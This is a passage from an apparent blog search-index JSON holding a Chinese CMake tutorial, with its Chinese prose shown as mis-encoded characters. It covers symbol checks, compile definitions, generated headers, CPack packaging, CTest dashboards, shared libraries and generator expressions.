å‡½æ•°ä¸­çš„å¹³æ–¹æ ¹ã€‚æˆ‘ä»¬é¦–å…ˆä½¿ç”¨é¡¶å±‚CMakeLists.txtä¸­çš„CheckSymbolExistsæ¨¡å—æµ‹è¯•è¿™äº›å‡½æ•°æ˜¯å¦å¯ç”¨ã€‚åœ¨æŸäº›å¹³å°ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é“¾æ¥åˆ°måº“ã€‚å¦‚æœæœ€åˆæ²¡æœ‰æ‰¾åˆ°logå’Œexpï¼Œåˆ™éœ€è¦ä½¿ç”¨måº“å¹¶å†æ¬¡å°è¯•ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨TutorialConfig.h.inä¸­çš„æ–°å®šä¹‰ï¼Œæ‰€ä»¥ä¸€å®šè¦åœ¨é…ç½®è¯¥æ–‡ä»¶ä¹‹å‰è®¾ç½®å®ƒä»¬ã€‚ å¦‚æœç³»ç»Ÿä¸Šæœ‰logå’Œexpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†åœ¨mysqrtå‡½æ•°ä¸­ä½¿ç”¨å®ƒä»¬æ¥è®¡ç®—å¹³æ–¹æ ¹ã€‚åœ¨MathFunctions/mysqrt.cxxä¸­çš„mysqrtå‡½æ•°ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼ˆåœ¨è¿”å›ç»“æœä¹‹å‰ä¸è¦å¿˜è®°#endifï¼ï¼‰ã€‚ é‡æ–°æ„å»ºé¡¹ç›®ï¼Œä¼šå‘ç°æ— è®ºå¹³å°ä¸Šæ˜¯å¦æœ‰logå’Œexpï¼Œéƒ½ä¸ä¼šè°ƒç”¨å®ƒä»¬ã€‚å› ä¸ºæˆ‘ä»¬å¿˜è®°äº†åœ¨mysqrt.cxxä¸­ include TutorialConfig.hã€‚ç°åœ¨æ›´æ–° æˆ‘ä»¬è¿˜éœ€è¦æ›´æ–°MathFunctions / CMakeLists.txtï¼Œä»¥ä¾¿mysqrt.cxxçŸ¥é“æ­¤æ–‡ä»¶çš„ä½ç½®ï¼š target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_BINARY_DIR} ) ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:5:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æŒ‡å®šç¼–è¯‘å®šä¹‰ é™¤äº†åœ¨TutorialConfig.hä¸­ä¿å­˜HAVE_LOGå’ŒHAVE_EXPå€¼ï¼Œæˆ‘ä»¬è¿˜æœ‰æ›´å¥½çš„æ–¹æ³•å—ï¼Ÿè®©æˆ‘ä»¬å°è¯•ä½¿ç”¨target_compile_definitions()ã€‚ é¦–å…ˆï¼Œä»TutorialConfig.h.inä¸­åˆ é™¤å®šä¹‰ã€‚æˆ‘ä»¬ä¸å†éœ€è¦åœ¨mysqrt.cxxä¸­ include TutorialConfig.hæˆ–MathFunctions/CMakeLists.txtä¸­çš„å…¶ä»– include å†…å®¹ã€‚ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†HAVE_LOGå’ŒHAVE_EXPçš„æ£€æŸ¥ç§»è‡³MathFunctions/CMakeLists.txtï¼Œç„¶åå°†è¿™äº›å€¼æŒ‡å®šä¸ºPRIVATEç¼–è¯‘å®šä¹‰ã€‚ include(CheckSymbolExists) check_symbol_exists(log \"math.h\" HAVE_LOG) check_symbol_exists(exp \"math.h\" HAVE_EXP) if(NOT (HAVE_LOG AND HAVE_EXP)) unset(HAVE_LOG CACHE) unset(HAVE_EXP CACHE) set(CMAKE_REQUIRED_LIBRARIES \"m\") check_symbol_exists(log \"math.h\" HAVE_LOG) check_symbol_exists(exp \"math.h\" HAVE_EXP) if(HAVE_LOG AND HAVE_EXP) target_link_libraries(MathFunctions PRIVATE m) endif() endif() # add compile definitions if(HAVE_LOG AND HAVE_EXP) target_compile_definitions(MathFunctions PRIVATE \"HAVE_LOG\" \"HAVE_EXP\") endif() ä¹‹åå†é‡æ–°æ„å»ºå¹¶è¿è¡Œé¡¹ç›®ï¼ŒæŸ¥çœ‹ç»“æœã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:5:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ è‡ªå®šä¹‰å‘½ä»¤å’Œç”Ÿæˆçš„æ–‡ä»¶ å‡è®¾ï¼Œä½œä¸ºæœ¬æ•™ç¨‹çš„ç›®çš„ï¼Œæˆ‘ä»¬å†³å®šæ°¸è¿œä¸è¦ä½¿ç”¨å¹³å°æä¾›çš„logå’Œexpå‡½æ•°ï¼Œè€Œæ˜¯æƒ³ç”Ÿæˆä¸€ä¸ªé¢„è®¡ç®—å€¼çš„è¡¨ï¼Œä»¥ä¾¿åœ¨mysqrtå‡½æ•°ä¸­ä½¿ç”¨ã€‚åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºè¯¥è¡¨ä½œä¸ºæ„å»ºè¿‡ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œç„¶åå°†è¯¥è¡¨ç¼–è¯‘åˆ°æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºä¸­ã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ é™¤MathFunctions/CMakeLists.txtä¸­å¯¹logå’Œexpå‡½æ•°çš„æ£€æŸ¥ã€‚ç„¶åä»mysqrt.cxxä¸­åˆ é™¤å¯¹HAVE_LOGå’ŒHAVE_EXPçš„æ£€æŸ¥ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ é™¤#include ã€‚ åœ¨MathFunctionså­ç›®å½•ä¸­ï¼Œæä¾›äº†ä¸€ä¸ªåä¸ºMakeTable.cxxçš„æ–°æºæ–‡ä»¶æ¥ç”Ÿæˆè¡¨ã€‚ æŸ¥çœ‹å®Œæ–‡ä»¶åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥è¡¨æ˜¯ä½œä¸ºæœ‰æ•ˆçš„ C ++ä»£ç ç”Ÿæˆçš„ï¼Œå¹¶ä¸”è¾“å‡ºæ–‡ä»¶åä½œä¸ºå‚æ•°ä¼ å…¥ã€‚ // A simple program that builds a sqrt table #include \u003ccmath\u003e #include \u003cfstream\u003e #include \u003ciostream\u003e int main(int argc, char *argv[]) { // make sure we have enough arguments if (argc \u003c 2) { return 1; } std::ofstream fout(argv[1], std::ios_base::out); const bool fileOpen = fout.is_open(); if (fileOpen) { fout \u003c\u003c \"double sqrtTable[] = {\" \u003c\u003c std::endl; for (int i = 0; i \u003c 10; ++i) { fout \u003c\u003c sqrt(static_cast\u003cdouble\u003e(i)) \u003c\u003c \",\" \u003c\u003c std::endl; } // close the table with a zero fout \u003c\u003c \"0};\" \u003c\u003c std::endl; fout.close(); } return fileOpen ? 0 : 1; // return 0 if wrote the file } ä¸‹ä¸€æ­¥æ˜¯å°†é€‚å½“çš„å‘½ä»¤æ·»åŠ åˆ°MathFunctions/CMakeLists.txtæ–‡ä»¶ä¸­ï¼Œä»¥æ„å»ºMakeTableå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶ååœ¨æ„å»ºè¿‡ç¨‹ä¸­è¿è¡Œå®ƒã€‚éœ€è¦ä¸€äº›å‘½ä»¤æ¥å®Œæˆæ­¤æ“ä½œã€‚ é¦–å…ˆï¼Œåœ¨MathFunctions/CMakeLists.txtçš„é¡¶éƒ¨ï¼Œæ·»åŠ MakeTableçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±åƒæ·»åŠ ä»»ä½•å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶ä¸€æ ·ã€‚ add_executable(MakeTable MakeTable.cxx) ç„¶åï¼Œæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æŒ‡å®šå¦‚ä½•é€šè¿‡è¿è¡ŒMakeTableæ¥äº§ç”ŸTable.hã€‚ add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¿…é¡»è®© CMake çŸ¥é“mysqrt.cxxå¦‚ä½•ä¾èµ–ç”Ÿæˆçš„æ–‡ä»¶Table.hã€‚é€šè¿‡å°†ç”Ÿæˆçš„Table.hæ·»åŠ åˆ°åº“MathFunctionsçš„æºåˆ—è¡¨ä¸­ï¼Œå¯ä»¥å®Œæˆæ­¤æ“ä½œã€‚ add_library(MathFunctions mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) æˆ‘ä»¬è¿˜å¿…é¡»å°†å½“å‰çš„äºŒè¿›åˆ¶ç›®å½•æ·»åŠ åˆ°åŒ…å«ç›®å½•åˆ—è¡¨ä¸­ï¼Œä»¥ä¾¿mysqrt.cxxå¯ä»¥æ‰¾åˆ°å¹¶åŒ…å«Table.hã€‚ target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) ç°åœ¨ï¼Œæˆ‘ä»¬ä½¿ç”¨ç”Ÿæˆçš„è¡¨ã€‚é¦–å…ˆï¼Œä¿®æ”¹mysqrt.cxxä»¥åŒ…å«Table.hã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é‡å†™mysqrtå‡½æ•°ä»¥ä½¿ç”¨è¯¥è¡¨ï¼š #include \u003ciostream\u003e #include \"MathFunctions.h\" #include \"Table.h\" double mysqrt(double x) { if (x \u003c= 0) { return 0; } // use the table to help find an initial value double result = x; if (x \u003e= 1 \u0026\u0026 x \u003c 10) { std::cout \u003c\u003c \"Use the table to help find an initial value \" \u003c\u003c std::endl; result = sqrtTable[static_cast\u003cint\u003e(x)]; } // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } æ„å»ºæ­¤é¡¹ç›®æ—¶ï¼Œå®ƒå°†é¦–å…ˆæ„å»ºMakeTableå¯æ‰§è¡Œæ–‡ä»¶ã€‚ç„¶åå®ƒå°†è¿è¡ŒMakeTableç”ŸæˆTable.hã€‚æœ€åï¼Œå®ƒå°†ç¼–è¯‘åŒ…æ‹¬Table.hçš„mysqrt.cxxï¼Œä»¥ç”ŸæˆMathFunctionsåº“ã€‚ åšå®Œè¿™äº›æ›´æ–°åï¼Œå†ç»§ç»­æ„å»ºé¡¹ç›®ã€‚è¿è¡Œæ„å»ºå¥½çš„ Tutorial å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éªŒè¯ç»“æœæ˜¯å¦ä¸å‰é¢ç›¸åŒã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:6:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ„å»ºå®‰è£…ç¨‹åº æ¥ä¸‹æ¥å‡è®¾æˆ‘ä»¬æƒ³æŠŠæˆ‘ä»¬çš„é¡¹ç›®å‘å¸ƒç»™å…¶ä»–äººï¼Œä»¥ä¾¿ä»–ä»¬èƒ½å¤Ÿä½¿ç”¨å®ƒã€‚æˆ‘ä»¬å¸Œæœ›åœ¨ä¸åŒçš„å¹³å°ä¸Šæä¾›äºŒè¿›åˆ¶å’Œæºä»£ç çš„å‘å¸ƒã€‚è¿™ä¸æˆ‘ä»¬ä¹‹å‰åœ¨å®‰è£…å’Œæµ‹è¯•ï¼ˆç¬¬ 4 æ­¥ï¼‰ä¸­æ‰€åšçš„å®‰è£…æœ‰äº›ä¸åŒï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å®‰è£…çš„æ˜¯æˆ‘ä»¬ä»æºä»£ç ä¸­æ„å»ºçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æ„å»ºæ”¯æŒäºŒè¿›åˆ¶å®‰è£…å’ŒåŒ…ç®¡ç†åŠŸèƒ½çš„å®‰è£…åŒ…ã€‚ä¸ºäº†å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨CPackæ¥åˆ›å»ºç‰¹å®šå¹³å°çš„å®‰è£…åŒ…ã€‚å…·ä½“æ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é¡¶å±‚CMakeLists.txtæ–‡ä»¶çš„åº•éƒ¨æ·»åŠ å‡ è¡Œå†…å®¹: include(InstallRequiredSystemLibraries) set(CPACK_RESOURCE_FILE_LICENSE \"${CMAKE_CURRENT_SOURCE_DIR}/License.txt\") set(CPACK_PACKAGE_VERSION_MAJOR \"${Tutorial_VERSION_MAJOR}\") set(CPACK_PACKAGE_VERSION_MINOR \"${Tutorial_VERSION_MINOR}\") include(CPack) é¦–å…ˆåŒ…å«InstallRequiredSystemLibrariesã€‚è¿™ä¸ªæ¨¡å—å°†åŒ…å«é¡¹ç›®åœ¨å½“å‰å¹³å°ä¸Šéœ€è¦çš„ä»»ä½•è¿è¡Œæ—¶åº“ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€äº›CPackå˜é‡ï¼Œå°†è¿™ä¸ªé¡¹ç›®çš„è®¸å¯è¯å’Œç‰ˆæœ¬ä¿¡æ¯å­˜å‚¨åœ¨é‚£é‡Œã€‚ç‰ˆæœ¬ä¿¡æ¯åœ¨æœ¬æ•™ç¨‹çš„å‰é¢å·²ç»è®¾ç½®å¥½äº†ï¼Œlicense.txtå·²ç»åŒ…å«åœ¨æœ¬æ­¥éª¤çš„é¡¶å±‚æºç›®å½•ä¸­: This is the open source License.txt file introduced in CMake/Tutorial/Step7... æœ€åæˆ‘ä»¬åŠ å…¥CPackæ¨¡å—ï¼Œå®ƒå°†ä½¿ç”¨è¿™äº›å˜é‡å’Œå½“å‰ç³»ç»Ÿçš„ä¸€äº›å…¶ä»–å±æ€§æ¥è®¾ç½®å®‰è£…ç¨‹åºã€‚ ä¸‹ä¸€æ­¥æ˜¯ä»¥é€šå¸¸çš„æ–¹å¼æ„å»ºé¡¹ç›®ï¼Œç„¶åè¿è¡Œcpackå¯æ‰§è¡Œæ–‡ä»¶ã€‚è¦æ„å»ºä¸€ä¸ªäºŒè¿›åˆ¶å‘è¡Œç‰ˆï¼Œè¯·åœ¨äºŒè¿›åˆ¶ç›®å½•ä¸‹è¿è¡Œã€‚ è¦æŒ‡å®šç”Ÿæˆå™¨ï¼Œè¯·ä½¿ç”¨-Gé€‰é¡¹ã€‚å¯¹äºå¤šé…ç½®çš„æ„å»ºï¼Œä½¿ç”¨-Cæ¥æŒ‡å®šé…ç½®ã€‚ä¾‹å¦‚ï¼š cpack -G ZIP -C Debug è¦åˆ›å»ºä¸€ä¸ªæºç åˆ†å‘ï¼Œå¯ä»¥è¾“å…¥ï¼š cpack --config CPackSourceConfig.cmake æˆ–è€…ï¼Œè¿è¡Œmake packageæˆ–å³é”®ç‚¹å‡»Package target å¹¶ä» IDE ä¸­æ„å»ºé¡¹ç›®ã€‚ è¿è¡Œåœ¨äºŒè¿›åˆ¶ç›®å½•ä¸‹æ‰¾åˆ°çš„å®‰è£…ç¨‹åºã€‚ç„¶åè¿è¡Œå·²å®‰è£…çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶éªŒè¯å®ƒæ˜¯å¦å·¥ä½œã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:7:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ  DashBoard æ”¯æŒ æ·»åŠ æ”¯æŒå°†æˆ‘ä»¬çš„æµ‹è¯•ç»“æœæäº¤åˆ° dashboard å¾ˆç®€å•ã€‚æˆ‘ä»¬å·²ç»ä¸ºæˆ‘ä»¬çš„é¡¹ç›®å®šä¹‰äº†ä¸€äº›æµ‹è¯•ã€‚ç°åœ¨æˆ‘ä»¬åªéœ€è¦è¿è¡Œè¿™äº›æµ‹è¯•å¹¶å°†å®ƒä»¬æäº¤åˆ°ä»ªè¡¨æ¿ã€‚ä¸ºäº†åŒ…å«å¯¹ä»ªè¡¨ç›˜çš„æ”¯æŒï¼Œæˆ‘ä»¬åœ¨é¡¶å±‚çš„CMakeLists.txtä¸­åŠ å…¥äº†CTestæ¨¡å—: å°†enable_testing()æ›¿æ¢ä¸ºinclude(CTest)ã€‚ CTestæ¨¡å—ä¼šè‡ªåŠ¨è°ƒç”¨enable_testing()ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»CMakeæ–‡ä»¶ä¸­åˆ é™¤å®ƒã€‚ æˆ‘ä»¬è¿˜éœ€è¦åœ¨é¡¶å±‚ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªCTestConfig.cmakeæ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šé¡¹ç›®çš„åç§°å’Œæäº¤dashboardçš„ä½ç½®ã€‚ set(CTEST_PROJECT_NAME \"CMakeTutorial\") set(CTEST_NIGHTLY_START_TIME \"00:00:00 EST\") set(CTEST_DROP_METHOD \"http\") set(CTEST_DROP_SITE \"my.cdash.org\") set(CTEST_DROP_LOCATION \"/submit.php?project=CMakeTutorial\") set(CTEST_DROP_SITE_CDASH TRUE) å½“ctestå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶ï¼Œå®ƒå°†è¯»å–è¿™ä¸ªæ–‡ä»¶ã€‚è¦åˆ›å»ºä¸€ä¸ªç®€å•çš„ dashboardï¼Œä½ å¯ä»¥è¿è¡Œcmakeå¯æ‰§è¡Œæ–‡ä»¶æˆ–cmake-guiæ¥é…ç½®é¡¹ç›®ï¼Œä½†å…ˆä¸è¦æ„å»ºå®ƒã€‚åˆ‡æ¢åˆ°äºŒå‰æ ‘çŠ¶ç›®å½•ï¼Œç„¶åè¿è¡Œã€‚ ctest [-VV] -D Experimental è¯·è®°ä½ï¼Œå¯¹äºå¤šé…ç½®ç”Ÿæˆå™¨ï¼ˆå¦‚ Visual Studioï¼‰ï¼Œå¿…é¡»æŒ‡å®šé…ç½®ç±»å‹ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:8:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ··åˆé™æ€å’Œå…±äº« åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œå°†å±•ç¤ºå¦‚ä½•ä½¿ç”¨BUILD_SHARED_LIBSå˜é‡æ¥æ§åˆ¶add_library()çš„é»˜è®¤è¡Œä¸ºï¼Œå¹¶å…è®¸æ§åˆ¶æ²¡æœ‰æ˜ç¡®ç±»å‹(STATIC, SHARED, MODULE or OBJECT)çš„åº“çš„æ„å»ºæ–¹å¼ã€‚ ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨é¡¶å±‚çš„CMakeLists.txtä¸­æ·»åŠ BUILD_SHARED_LIBSã€‚æˆ‘ä»¬ä½¿ç”¨option()å‘½ä»¤ï¼Œå› ä¸ºå®ƒå…è®¸ç”¨æˆ·é€‰æ‹©æ€§åœ°é€‰æ‹©è¯¥å€¼æ˜¯å¦åº”è¯¥æ˜¯ ON æˆ– OFFã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬å°†é‡æ„ MathFunctionsï¼Œ ä½¿å…¶æˆä¸ºä¸€ä¸ªçœŸæ­£çš„åº“ï¼Œ å°è£…ä½¿ç”¨ mysqrt æˆ– sqrtï¼Œ è€Œä¸æ˜¯è¦æ±‚è°ƒç”¨ä»£ç æ¥å®Œæˆè¿™ä¸ªé€»è¾‘ã€‚è¿™ä¹Ÿæ„å‘³ç€ USE_MYMATHå°†ä¸ä¼šæ§åˆ¶æ„å»º MathFunctionsï¼Œè€Œæ˜¯æ§åˆ¶è¿™ä¸ªåº“çš„è¡Œä¸ºã€‚ ç¬¬ä¸€æ­¥æ˜¯æ›´æ–°é¡¶å±‚CMakeLists.txtçš„èµ·å§‹éƒ¨åˆ†ï¼Œ ä½¿å…¶çœ‹èµ·æ¥åƒè¿™æ ·: cmake_minimum_required(VERSION 3.10) # set the project name and version project(Tutorial VERSION 1.0) # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) # control where the static and shared libraries are built so that on windows # we don't need to tinker with the path to run the executable set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") set(CMAKE_LIBRARY_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") set(CMAKE_RUNTIME_OUTPUT_DIRECTORY \"${PROJECT_BINARY_DIR}\") option(BUILD_SHARED_LIBS \"Build using shared libraries\" ON) # configure a header file to pass the version number only configure_file(TutorialConfig.h.in TutorialConfig.h) # add the MathFunctions library add_subdirectory(MathFunctions) # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC MathFunctions) ç°åœ¨æˆ‘ä»¬å·²ç»è®©MathFunctionså§‹ç»ˆè¢«ä½¿ç”¨ï¼Œæ¥ä¸‹æ¥éœ€è¦æ›´æ–°è¯¥åº“çš„é€»è¾‘ã€‚å› æ­¤ï¼Œ åœ¨ MathFunctions/CMakeLists.txtä¸­ï¼Œ æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª SqrtLibraryï¼Œ å½“ USE_MYMATH å¯ç”¨æ—¶ï¼Œ è¿™ä¸ªSqrtLibraryå°†æœ‰æ¡ä»¶åœ°è¢«æ„å»ºå’Œå®‰è£…ã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªæ•™ç¨‹ï¼Œ æˆ‘ä»¬å°†æ˜ç¡®è¦æ±‚é™æ€åœ°æ„å»º SqrtLibraryã€‚ æœ€ç»ˆçš„ç»“æœæ˜¯MathFunctions/CMakeLists.txt åº”è¯¥æ˜¯è¿™æ ·çš„: # add the library that runs add_library(MathFunctions MathFunctions.cxx) # state that anybody linking to us needs to include the current source dir # to find MathFunctions.h, while we don't. target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) # should we use our own math functions option(USE_MYMATH \"Use tutorial provided math implementation\" ON) if(USE_MYMATH) target_compile_definitions(MathFunctions PRIVATE \"USE_MYMATH\") # first we add the executable that generates the table add_executable(MakeTable MakeTable.cxx) # add the command to generate the source code add_custom_command( OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/Table.h COMMAND MakeTable ${CMAKE_CURRENT_BINARY_DIR}/Table.h DEPENDS MakeTable ) # library that just does sqrt add_library(SqrtLibrary STATIC mysqrt.cxx ${CMAKE_CURRENT_BINARY_DIR}/Table.h ) # state that we depend on our binary dir to find Table.h target_include_directories(SqrtLibrary PRIVATE ${CMAKE_CURRENT_BINARY_DIR} ) target_link_libraries(MathFunctions PRIVATE SqrtLibrary) endif() # define the symbol stating we are using the declspec(dllexport) when # building on windows target_compile_definitions(MathFunctions PRIVATE \"EXPORTING_MYMATH\") # install rules set(installable_libs MathFunctions) if(TARGET SqrtLibrary) list(APPEND installable_libs SqrtLibrary) endif() install(TARGETS ${installable_libs} DESTINATION lib) install(FILES MathFunctions.h DESTINATION include) æ¥ä¸‹æ¥ï¼Œæ›´æ–° MathFunctions/mysqrt.cxxï¼Œä½¿ç”¨ mathfunctionså’Œ detail å‘½åç©ºé—´ã€‚ #include \u003ciostream\u003e #include \"MathFunctions.h\" #include \"Table.h\" namespace mathfunctions { namespace detail { double mysqrt(double x) { if (x \u003c= 0) { return 0; } double result = x; if (x \u003e= 1 \u0026\u0026 x \u003c 10) { std::cout \u003c\u003c \"Use the table to help find an initial value \" \u003c\u003c std::endl; result = sqrtTable[static_cast\u003cint\u003e(x)]; } // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } } // namespace detail } // namespace mathfunctions æˆ‘ä»¬è¿˜éœ€è¦åœ¨ tutorial.cxxä¸­åšä¸€äº›ä¿®æ”¹ï¼Œ ä½¿å®ƒä¸å†ä½¿ç”¨ USE_MYMATH: å§‹ç»ˆ include MathFunctions.h å§‹ç»ˆä½¿ç”¨ mathfunctions::sqrt ä¸è¦ include cmath mysqrt.hå¦‚ä¸‹ï¼š namespace mathfunctions { namespace detail { double mysqrt(double x); } } // namespace mathfunctions MathFunctions.cxxå¦‚ä¸‹ï¼š #include \"MathFunctions.h\" #include \u003ccmath\u003e #ifdef USE_MYMATH #include \"mysqrt.h\" #endif namespace mathfunctions { double sqrt(double x) { #ifdef USE_MYMATH return de","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:9:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ ç”Ÿæˆå™¨è¡¨è¾¾å¼ åœ¨æ„å»ºç³»ç»Ÿç”ŸæˆæœŸé—´ä¼šæ‰§è¡ŒGenerator expressionï¼Œä»¥ç”Ÿæˆç‰¹å®šäºæ¯ä¸ªæ„å»ºé…ç½®çš„ä¿¡æ¯ã€‚ åœ¨è®¸å¤šç›®æ ‡å±æ€§ï¼ˆä¾‹å¦‚LINK_LIBRARIESï¼ŒINCLUDE_DIRECTORIESï¼ŒCOMPLIE_DEFINITIONSç­‰ï¼‰çš„ä¸Šä¸‹æ–‡ä¸­å…è®¸Generator expressionã€‚åœ¨ä½¿ç”¨å‘½ä»¤å¡«å……è¿™äº›å±æ€§ï¼ˆä¾‹å¦‚target_link_libraries()ï¼Œtarget_include_directories()ï¼Œtarget_compile_definitions()ç­‰ï¼‰æ—¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚ Generator expressionå¯ç”¨äºå¯ç”¨æ¡ä»¶é“¾æ¥ã€ç¼–è¯‘æ—¶ä½¿ç”¨çš„æ¡ä»¶å®šä¹‰ã€æ¡ä»¶ include ç›®å½•ç­‰ã€‚è¿™äº›æ¡ä»¶å¯ä»¥åŸºäºæ„å»ºé…ç½®ã€ç›®æ ‡å±æ€§ã€å¹³å°ä¿¡æ¯æˆ–ä»»ä½•å…¶ä»–å¯æŸ¥è¯¢çš„ä¿¡æ¯ã€‚ æœ‰ä¸åŒç±»å‹çš„Generator expressionï¼ŒåŒ…æ‹¬é€»è¾‘è¡¨è¾¾å¼ã€ä¿¡æ¯è¡¨è¾¾å¼å’Œè¾“å‡ºè¡¨è¾¾å¼ã€‚ é€»è¾‘è¡¨è¾¾å¼ç”¨äºåˆ›å»ºæ¡ä»¶è¾“å‡ºã€‚åŸºæœ¬çš„è¡¨è¾¾å¼æ˜¯ 0 å’Œ 1 è¡¨è¾¾å¼ã€‚$\u003c0:...\u003eçš„ç»“æœæ˜¯ç©ºå­—ç¬¦ä¸²ï¼Œ\u003c1:...\u003eçš„ç»“æœæ˜¯\"... \"çš„å†…å®¹ã€‚å®ƒä»¬ä¹Ÿå¯ä»¥åµŒå¥—ã€‚ Generator expressionçš„ä¸€ä¸ªå¸¸è§ç”¨æ³•æ˜¯æœ‰æ¡ä»¶åœ°æ·»åŠ ç¼–è¯‘å™¨æ ‡å¿—ï¼Œä¾‹å¦‚è¯­è¨€çº§åˆ«æˆ–è­¦å‘Šçš„æ ‡å¿—ã€‚ä¸€ä¸ªå¾ˆå¥½çš„æ¨¡å¼æ˜¯å°†è¿™äº›ä¿¡æ¯å…³è”åˆ°ä¸€ä¸ªINTERFACEç›®æ ‡ï¼Œå…è®¸è¿™äº›ä¿¡æ¯ä¼ æ’­ã€‚è®©æˆ‘ä»¬ä»æ„é€ ä¸€ä¸ªINTERFACEç›®æ ‡å¼€å§‹ï¼Œå¹¶æŒ‡å®šæ‰€éœ€çš„ C++æ ‡å‡†ä¸º 11ï¼Œè€Œä¸æ˜¯ä½¿ç”¨CMAKE_CXX_STANDARDã€‚ åŸä»£ç å¦‚ä¸‹ï¼š # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) æ›¿æ¢ä¸ºï¼š add_library(tutorial_compiler_flags INTERFACE) target_compile_features(tutorial_compiler_flags INTERFACE cxx_std_11) æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸ºé¡¹ç›®æ·»åŠ æ‰€éœ€çš„ç¼–è¯‘å™¨è­¦å‘Šæ ‡å¿—ã€‚ç”±äºè­¦å‘Šæ ‡å¿—å› ç¼–è¯‘å™¨è€Œå¼‚ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨COMPILE_LANG_AND_IDç”Ÿæˆå™¨è¡¨è¾¾å¼æ¥æ§åˆ¶åœ¨ç»™å®šè¯­è¨€å’Œä¸€ç»„ç¼–è¯‘å™¨ ID çš„æƒ…å†µä¸‹åº”åº”ç”¨çš„æ 